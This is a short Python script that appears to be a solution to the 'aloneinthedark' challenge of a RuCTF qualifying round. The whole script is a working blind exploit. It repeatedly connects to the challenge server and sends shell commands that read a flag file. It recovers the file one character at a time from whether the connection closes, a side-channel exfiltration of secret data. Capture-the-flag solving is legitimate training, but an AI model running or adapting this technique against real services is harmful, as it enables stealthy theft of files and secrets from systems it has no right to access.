import itertools
import time
import socket
import sys

# thing = """out="$(echo *)"; [ "%s" == "${out:%d:1}" ] && exit"""
# chrs = [''] + ['%c' % c for c in range(0x20, 0x80)]

thing = """read out < FLAG_NOGUESSING; [ "%s" == "${out:%d:1}" ] && exit"""
chrs = [''] + list("0123456789abcdef")

bytes = []
for i in itertools.count():
  sock = socket.socket()
  sock.connect(('aloneinthedark.quals.ructf.org', 3255))
  sock.settimeout(1)
  x = sock.recv(2000)
  byte = '?'
  for c in chrs:
    payload = thing % (c, i)
    print bytes, payload
    sock.send(payload+'\n\n')
    time.sleep(0.1)
    try:
      x = sock.recv(1000)
    except socket.timeout:
      continue
    except socket.error:
      byte = c
      break
  if byte == '':
    break
  bytes.append(byte)
print repr(''.join(bytes))
